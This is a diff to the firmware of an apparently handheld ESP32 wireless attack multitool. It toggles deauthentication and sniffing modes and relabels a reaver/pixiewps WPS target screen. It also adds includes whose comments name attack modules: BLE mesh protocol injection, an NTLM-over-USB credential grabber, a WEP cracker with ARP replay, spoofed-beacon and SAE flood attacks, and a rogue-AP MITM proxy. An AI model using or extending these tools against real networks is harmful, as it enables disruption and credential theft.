@@ -37069,6 +37817,7 @@ void startESP32C5SerialMenu() {
         case 6:
           g_c5_deauth_on = !g_c5_deauth_on;
           c5_sendScriptLine(g_c5_deauth_on ? "DEAUTH ON" : "DEAUTH OFF");
+          if (g_c5_deauth_on) g_c5_ward_on = false;  // mirror slave exclusivity
           feedback("DEAUTH", g_c5_deauth_on ? "Enabled" : "Disabled");
           break;
 
@@ -37083,6 +37832,7 @@ void startESP32C5SerialMenu() {
         case 9:
           g_c5_sniff_on = !g_c5_sniff_on;
           c5_sendScriptLine(g_c5_sniff_on ? "SNIFF ON" : "SNIFF OFF");
+          if (g_c5_sniff_on) g_c5_ward_on = false;  // mirror slave exclusivity
           feedback("SNIFF", g_c5_sniff_on ? "Enabled" : "Disabled");
           break;
         case 10: c5_promptAndSend("SNIFF_TIMEOUT ms", "SNIFF_TIMEOUT"); break;
@@ -37105,7 +37855,17 @@ void startESP32C5SerialMenu() {
         case 24: c5_sendScriptLine("HELP"); c5_rawMonitor(); break;
         case 25: c5_promptAndSend("Custom CMD", ""); break;
         case 26: c5_rawMonitor(); break;
-        case 27: backDebounce(); goto exit_menu;
+        case 27:
+          g_c5_led_on = !g_c5_led_on;
+          c5_sendScriptLine(g_c5_led_on ? "LED ON" : "LED OFF");
+          feedback("LED", g_c5_led_on ? "On" : "Off");
+          break;
+        case 28:
+          c5_sendScriptLine("FACTORY");
+          feedback("FACTORY", "Slave reset to defaults");
+          c5_syncStateFromInfo();
+          break;
+        case 29: backDebounce(); goto exit_menu;
       }
 
       need = true;
@@ -37116,6 +37876,7 @@ void startESP32C5SerialMenu() {
   }
 
 exit_menu:
+  if (msp) mcv.deleteSprite();   // libere le buffer double-tampon (zero RAM residuelle)
   c5_uartEnd();
   waitAndReturnToMenu("Back to menu");
 }
@@ -41043,7 +41804,7 @@ void wpsa_detail(M5Canvas* sprite, bool use_sprite, int sel) {
   sp.setCursor(4, y); sp.printf("Channel : %d", a.channel); y += 14;
   sp.setCursor(4, y); sp.printf("RSSI : %d dBm", a.rssi); y += 14;
   sp.setCursor(4, y); sp.printf("WPS : %s, PIN confirme", a.wps1only ? "1.0" : "2.0"); y += 14;
-  sp.setTextColor(0x5AEB); sp.setCursor(4, 122); sp.print("Cible reaver/pixiewps = BSSID  BKSP=back");
+  sp.setTextColor(0x5AEB); sp.setCursor(4, 122); sp.print("reaver/pixiewps target = BSSID  BKSP=back");
   if (use_sprite) sprite->pushSprite(0, 0);
   enterDebounce();
   while (true) { M5.update(); cardUpdate(); if (kp(KEY_BACKSPACE) || kp(KEY_ENTER)) { keyRelease(); break; } delay(15); }
@@ -50610,6 +51371,11 @@ bool nfc_emul_tx_isodep(const uint8_t* payload, int len, uint8_t bn, int cid) {
 // Included here so it sees c1_*, mf_crypto, NfcCardInfo and the nfc_emul_* target
 // primitives defined above. Additive: no existing NFC path is modified.
 #include "src/nfc_mfemul.h"
+#include "src/castv2.h"           // Cast v2 (Chromecast CastChannel protobuf/TLS :8009) - AVANT casting.h (utilise ses fn)
+#include "src/casting.h"
+#include "src/bitchat_poison.h"   // bitchatpoison : injection protocolaire mesh BLE BitChat
+#include "src/lockpicker.h"       // lockpicker NTLM-over-USB (gadget RNDIS a la demande)
+#include "src/ledbgone.h"         // LED-B-Gone : equivalent BLE du TV-B-Gone (5 familles LED)
 
 // ---- ESP-NOW transport (broadcast, fragmented, half-duplex) ----
 #define RLY_MAGIC   0x5A
@@ -51168,6 +51934,7 @@ void nfc_mfemul_ui() {
 #include "src/wifi_csa.h"      // CSA (Channel Switch Announcement) spoofed-beacon attack
 #include "src/wifi_sae.h"      // WPA3/SAE checker + SAE commit flood
 #include "src/mitm_proxy.h"    // MITM proxy: rogue AP + STA uplink + DNS/HTTP/TLS transparent relay
+#include "src/wep_crack.h"     // WEP Cracker: detect WEP + capture IV + ARP replay -> .cap (aircrack PTW)
 #include "src/wifi_radar.h"   // DragonRadar port: passive 802.11 radar + BLE scan
 #include "src/smb_discover.h" // Auto SMB discovery + anonymous/guest browser (read-only)
 
@@ -54353,7 +55120,7 @@ void nfcMenu() {
                         df_select_app(aid);
                         uint8_t fids[32]; int nf = df_get_file_ids(fids, sizeof(fids));
                         if (nf < 0) { lines.push_back("  GetFileIDs KO"); continue; }
-                        snprintf(b, sizeof(b), "  %d fichier(s)", nf); lines.push_back(b);
+                        snprintf(b, sizeof(b), "  %d file(s)", nf); lines.push_back(b);
                         for (int f = 0; f < nf && f < 16; f++) {
                             uint8_t fs[24]; int fsl = df_get_file_settings(fids[f], fs, sizeof(fs));
                             if (fsl >= 2) {
